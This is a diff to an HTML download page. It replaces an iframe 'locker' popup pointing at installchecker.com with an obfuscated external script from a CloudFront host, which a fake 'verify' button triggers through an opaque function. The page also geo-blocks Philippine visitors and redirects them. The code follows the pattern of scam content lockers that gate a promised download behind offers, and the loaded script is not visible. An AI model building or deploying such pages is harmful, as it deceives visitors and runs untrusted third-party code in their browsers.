@@ -10,6 +10,11 @@
 
   <link rel="icon" type="image/png" sizes="16x16" href="https://i.ibb.co/N224P2Zv/favicon-16x16.png" />
 
+  <script type="text/javascript">
+    var FeyzU_CFK_jRpcmc = { "it": 4545411, "key": "cfeb0" };
+  </script>
+  <script src="https://d167xx758yszc9.cloudfront.net/662d87e.js"></script>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-T1M6M1HTJ8"></script>
   <script>
@@ -295,37 +300,6 @@
         opacity: 1;
       }
     }
-
-    .iframe-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.75);
-      justify-content: center;
-      align-items: center;
-      z-index: 10000;
-    }
-
-    .iframe-box {
-      background: #131313;
-      max-width: 800px;
-      width: 90%;
-      height: 80%;
-      border-radius: 12px;
-      display: flex;
-      flex-direction: column;
-      animation: slideUp 0.5s ease forwards;
-    }
-
-    .iframe-frame {
-      flex: 1;
-      border: none;
-      border-radius: 8px;
-      width: 100%;
-    }
   </style>
 
 </head>
@@ -380,14 +354,6 @@
     </div>
   </div>
 
-  <!-- Locker Iframe Popup -->
-  <div class="iframe-overlay" id="iframePopup">
-    <div class="iframe-box">
-      <iframe id="iframeLocker" src="" class="iframe-frame">
-      </iframe>
-    </div>
-  </div>
-
   <script>
     document.querySelectorAll(".download-btn").forEach(btn => {
       btn.addEventListener("click", function (e) {
@@ -398,21 +364,9 @@
     });
 
     document.getElementById("verifyBtn").addEventListener("click", function () {
-      og_load();
+      _Ts();
       document.getElementById("popup").style.display = "none";
       document.body.style.overflow = "auto";
-    });
-  </script>
-
-  <script>
-    const iframePopup = document.getElementById("iframePopup");
-    const iframeLocker = document.getElementById("iframeLocker");
-
-    document.getElementById("verifyBtn").addEventListener("click", function () {
-      document.getElementById("popup").style.display = "none";
-      iframeLocker.src = "https://installchecker.com/cl/i/kld9n8";
-      iframePopup.style.display = "flex";
-      document.body.style.overflow = "hidden";
     });
   </script>
 
@@ -478,15 +432,16 @@
   </script>
 
   <script>
-fetch("https://ipapi.co/json/")
-  .then(r => r.json())
-  .then(d => {
-    if (d.country === "PH") {
-      document.body.innerHTML = "<h2>Access Denied</h2><p>This content is not available in your region.</p>";
-      window.location.href = "https://google.com";
-    }
-  });
-</script>
+    fetch("https://ipapi.co/json/")
+      .then(r => r.json())
+      .then(d => {
+        if (d.country === "PH") {
+          document.body.innerHTML = "<h2>Access Denied</h2><p>This content is not available in your region.</p>";
+          window.location.href = "https://google.com";
+        }
+      });
+  </script>
 
 </body>
+
 </html>
